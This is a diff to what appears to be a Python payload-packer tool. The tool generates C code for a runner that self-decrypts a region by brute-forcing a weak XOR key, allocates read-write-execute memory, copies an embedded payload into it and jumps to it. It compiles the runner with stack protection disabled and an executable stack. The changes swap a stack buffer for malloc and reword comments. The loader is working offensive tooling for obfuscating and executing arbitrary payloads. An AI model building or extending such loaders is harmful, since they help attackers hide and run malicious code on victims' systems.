@@ -45,12 +45,10 @@ def generate_runner_c(encoded_payload, arch, raw_payload):
     At runtime, runner_entry() calls self_decrypt_region() to brute‑force
     the weak XOR key (0x42) on the region between __decrypt_start and __decrypt_end.
     Once decrypted, the runner allocates executable memory, copies the embedded
-    payload there, and transfers control to it.
+    payload there, and transfers control.
     
-    **Important:** This implementation relies on the linker placing the three
-    marker strings contiguously (or nearly so) in the final binary (typically in
-    the .rodata section). For production use you might need more robust techniques
-    (e.g. a custom linker script).
+    **Note:** This implementation assumes that the markers appear in order
+    in the final ELF’s .rodata section. In production you might use a linker script.
     """
     c_code = f'''\
 #include <stdio.h>
@@ -61,7 +59,7 @@ def generate_runner_c(encoded_payload, arch, raw_payload):
 
 #define WEAK_KEY 0x42
 
-// Marker variables (placed in .rodata by default).
+// Marker variables (expected to be placed consecutively in .rodata).
 char __decrypt_start[] = "DECO_START";
 char __decrypt_marker[] = "DECO";
 char __decrypt_end[]   = "DECO_END";
@@ -71,36 +69,38 @@ extern unsigned char encoded_payload[];
 extern size_t payload_size;
 
 // Self-decryption routine.
-// It brute-forces the XOR key over the region between __decrypt_start and __decrypt_end
-// until the first 4 bytes decrypt to "DECO".
+// Instead of allocating the temporary buffer on the stack, we use malloc.
 void self_decrypt_region() {{
     unsigned char *start = (unsigned char *)__decrypt_start;
     unsigned char *end = (unsigned char *)__decrypt_end;
     size_t region_size = end - start;
     int key;
+    unsigned char *temp = (unsigned char *)malloc(region_size);
+    if (!temp) {{
+        perror("malloc");
+        exit(1);
+    }}
     for (key = 0; key < 256; key++) {{
-        unsigned char temp[region_size];
         memcpy(temp, start, region_size);
         for (size_t i = 0; i < region_size; i++) {{
             temp[i] ^= key;
         }}
         if (memcmp(temp, __decrypt_marker, 4) == 0) {{
-            // Found correct key; decrypt in place.
             for (size_t i = 0; i < region_size; i++) {{
                 start[i] ^= key;
             }}
-            // Uncomment for debugging:
-            // printf("Self-decryption key found: 0x%02x\\n", key);
+            free(temp);
             return;
         }}
     }}
+    free(temp);
     fprintf(stderr, "Failed to self-decrypt runner region.\\n");
     exit(1);
 }}
 
 // Runner entry function.
-// It first self-decrypts the designated region, then allocates executable memory,
-// copies the embedded encoded payload there, and finally transfers control.
+// It self-decrypts the region, allocates executable memory, copies the payload,
+// and transfers control.
 void runner_entry() {{
     self_decrypt_region();
     void *exec_mem = mmap(NULL, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC,
@@ -134,7 +134,7 @@ int main(int argc, char *argv[]) {{
 def compile_runner(c_source, arch, output_filename):
     """
     Compile the generated C source into an ELF file using gcc.
-    For x32, the -m32 flag is added.
+    For x32, adds the -m32 flag.
     Stack protection is disabled and an executable stack is enabled.
     """
     tmp_dir = tempfile.mkdtemp(prefix="runner_build_")
@@ -193,7 +193,7 @@ def main():
     arch = detect_arch(args.file) if not args.raw else "x32"
     print(f"[+] Detected architecture: {arch}")
 
-    # Read input file.
+    # Read the input file.
     with open(args.file, "rb") as f:
         payload_data = f.read()
 
